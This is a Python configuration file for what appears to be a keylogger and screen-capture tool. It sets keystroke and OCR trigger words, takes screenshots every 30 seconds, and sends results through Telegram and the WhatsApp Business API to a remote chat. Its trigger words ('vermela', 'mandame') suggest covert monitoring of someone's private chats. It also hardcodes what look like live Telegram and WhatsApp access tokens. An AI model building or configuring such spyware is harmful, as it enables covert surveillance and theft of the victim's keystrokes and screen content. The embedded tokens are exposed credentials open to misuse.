import os

# Configuración de Telegram
TOKEN = os.getenv("TELEGRAM_TOKEN", "7883200709:AAFkqK0ax84dShVh2lZU30jLY1P4r8QJkvM")
CHAT_ID = None

# Palabras clave
PALABRAS_CLAVE_TECLADO = {"foto", "salir", "video", "vermela"}
PALABRAS_CLAVE_OCR = {"foto", "video", "mandame"}

# Configuración de archivos
CARPETA_CAPTURAS = "capturas"

# Configuración de timing
DELAY_ENTRE_ENVIOS = 15
# Intervalo entre capturas periódicas (segundos)
# Reducido a 30s según petición del usuario
CAPTURA_INTERVALO = 30

# Palabras peligrosas (detección adicional por keylogger)
# Edita esta lista según el contexto y necesidades
PALABRAS_PELIGROSAS = {"bomba", "explosivo", "ataque", "suicidio"}

# Configuración de OCR
OCR_LANGUAGES = ['es', 'en']
OCR_CONFIDENCE_THRESHOLD = 0.5

# Configuración de Telegram HTTP
HTTP_CONFIG = {
    'connection_pool_size': 5,
    'connect_timeout': 60.0,
    'read_timeout': 120.0,
    'write_timeout': 120.0,
    'pool_timeout': 120.0
}

# Configuración de WhatsApp (Meta / WhatsApp Business Cloud API)
# - TELEGRAM-like pattern: read from environment or fallback to empty string
# - PHONE_NUMBER_ID: el id del número provisto por Meta (ej: "123456789012345")
WHATSAPP_TOKEN = os.getenv("WHATSAPP_TOKEN", "EAATrK8XuQWYBPZBzZCn8urWEMXbZB9ud83zlChesZBVefp4eGXGSk9uG993QubYhS23ZCOR9Q6xashGQ7q9KBRIZC3wTmlDXhRQLGOqw4Toj2ZAoQmJ5x4V4rLViwrdc3HAJexopXFpAc5TjCTar5nO8ee2oSjx9ELDV3QPLU9WRRsKZA4twFM57uhAdykPY1bPu7gZDZD")
WHATSAPP_PHONE_NUMBER_ID = os.getenv("WHATSAPP_PHONE_NUMBER_ID", "904731122713746")
# Usar la versión que indique la documentación/ejemplo (v22.0)
WHATSAPP_API_VERSION = os.getenv("WHATSAPP_API_VERSION", "v22.0")
WHATSAPP_API_URL = f"https://graph.facebook.com/{WHATSAPP_API_VERSION}/{WHATSAPP_PHONE_NUMBER_ID}/messages"